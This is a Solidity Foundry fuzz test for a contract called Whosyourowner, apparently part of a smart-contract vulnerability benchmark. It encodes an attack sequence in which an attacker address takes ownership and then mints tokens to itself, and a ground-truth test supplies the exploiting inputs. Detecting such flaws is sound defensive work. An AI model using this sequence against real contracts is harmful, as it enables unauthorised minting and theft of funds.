// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "examples/Whosyourowner/Whosyourowner.sol";

contract WhosyourownerFuzzing is Test {
    address owner;
    address attacker;
    Whosyourowner token;

    uint256 public attackerInitBalance = 0;
    uint256 public tokenInitSupply = 1000 ether;
    uint256 public requiredToken = 100 ether;

    function setUp() public {
        owner = address(this);
        attacker = address(0xdeadbeef);
        vm.deal(attacker, attackerInitBalance);

        token = new Whosyourowner(tokenInitSupply);

    }

    function addressSelector(uint256 e) public returns (address) {
        address[3] memory addresses = [
            address(0),
            attacker,
            address(token)
        ];
        e = bound(e, 0, addresses.length - 1);
        return addresses[e];
    }

    function testAttackGT() public {
        testAttack(1, 1, requiredToken);
    }

    function testAttack(
        uint256 e0,
        uint256 e1,
        uint256 v0
    ) public {
        address a0 = addressSelector(e0);
        address a1 = addressSelector(e1);
        bool succeed;
        bytes memory call_data;
        vm.startPrank(attacker);

        call_data = abi.encodeWithSignature("transferOwnership(address)", a0);
        (succeed, ) = address(token).call(call_data);
        if (succeed) {
            call_data = abi.encodeWithSignature("mint(address,uint256)", a1, v0);
            (succeed, ) = address(token).call(call_data);
            if (succeed) {
                emit log_named_uint("token.balanceOf(attacker): ", token.balanceOf(attacker));
                assert(token.balanceOf(attacker) < requiredToken);
            }
        }
        vm.stopPrank();
    }
}
